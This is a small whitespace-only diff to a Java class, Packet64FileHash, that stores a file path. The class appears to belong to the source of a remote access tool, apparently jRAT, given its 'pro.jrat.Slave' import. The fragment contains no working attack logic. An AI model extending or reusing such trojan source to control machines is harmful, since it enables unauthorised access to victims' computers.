@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet64FileHash extends AbstractOutgoingPacket {
-	
+
 	private String file;
-	
+
 	public Packet64FileHash(String file) {
 		this.file = file;
 	}
